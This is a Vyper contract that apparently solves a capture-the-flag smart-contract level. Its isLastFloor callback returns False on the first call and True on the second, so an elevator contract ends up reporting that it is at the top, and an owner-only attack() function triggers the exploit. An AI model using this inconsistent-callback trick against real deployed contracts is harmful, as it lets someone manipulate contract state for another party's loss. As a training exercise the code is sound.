# @version ^0.3.7

interface InstanceInterface:
    def top() -> bool: view
    def goTo(_floor: uint256): nonpayable

owner: immutable(address)

instance: InstanceInterface
called: bool

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.instance.goTo(32)
    assert self.instance.top() == True, "!top"

@external
def isLastFloor(_floor: uint256) -> bool:
    if self.called == False:
        self.called = True
        return False
    else:
        return True
